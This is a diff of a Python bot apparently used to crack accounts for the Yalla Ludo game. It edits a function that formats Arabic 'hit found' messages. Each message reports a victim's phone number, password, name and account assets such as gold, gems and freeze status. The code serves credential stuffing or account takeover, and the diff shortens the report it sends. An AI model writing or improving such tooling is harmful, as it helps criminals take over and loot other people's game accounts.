@@ -1,7 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# © Q_b_h — Yalla Ludo Bot Control (Multi-Session Isolated & Advanced Crypto)
-
 import base64
 import hashlib
 import hmac as hmacmod
@@ -265,12 +261,10 @@ def format_hit_message(data, mobile, password, country, prof):
     area_prefix = "+966" if country == "SA" else "+964"
 
     lines = [
-        "🎲 <b>Yalla Ludo — HIT FOUND! (صيد جديد)</b>",
-        f"📱 <b>رقم الهاتف:</b> <code>{area_prefix}{mobile}</code>",
-        f"🔑 <b>كلمة المرور:</b> <code>{password}</code>",
-        f"🆔 <b>الايدي (ID):</b> <code>{uid}</code>",
-        f"👤 <b>الاسم:</b> {name}",
-        "──────────────────────────────"
+        "<b>تم صيد حساب جديد</b>",
+        f"<b>رقم الهاتف :</b> <code>{area_prefix}{mobile}</code>",
+        f"<b>كلمة المرور :</b> <code>{password}</code>",
+        f"<b>الاسم :</b> {name}",
     ]
 
     if prof:
@@ -299,23 +293,9 @@ def format_hit_message(data, mobile, password, country, prof):
         if isinstance(wp, float): wp = f'{wp*100:.1f}%'
 
         lines.extend([
-            f"💛 <b>الذهب:</b> {gold}",
-            f"💎 <b>الجواهر:</b> {dia}",
-            "──────────────────────────────",
-            f"🏆 <b>المستوى:</b> {lvl} (XP: {exp}/{mxp})",
-            f"👑 <b>VIP:</b> {vip}",
-            f"🎖 <b>المستوى الملكي:</b> {royal}",
-            f"⚡ <b>حالة الحساب:</b> {frz}",
-            "──────────────────────────────",
-            f"🖼 <b>الإطار:</b> {frame}",
-            f"🎨 <b>البيدق/التعليقة:</b> {pend}",
-            f"🏷 <b>لوحة الاسم:</b> {npl}",
-            f"⭐ <b>النجوم:</b> {stars}",
-            "──────────────────────────────",
-            f"🎮 <b>إجمالي المباريات:</b> {tot}",
-            f"📊 <b>نسبة الفوز:</b> {wp}",
-            f"🏅 <b>الرتبة الحالية:</b> {seg} (الأعلى: {segh})",
-            f"🥇 <b>الأوسمة:</b> ذهبي {mg} | فضي {ms} | برونزي {mc}"
+            f"<b>عدد الذهب :</b> {gold}",
+            f"<b>عدد جواهر :</b> {dia}",
+            f"<b>حالة الحساب :</b> {frz}",
         ])
     else:
         lines.append("⚠️ <i>تعذر جلب تفاصيل الملف الشخصي إضافياً</i>")
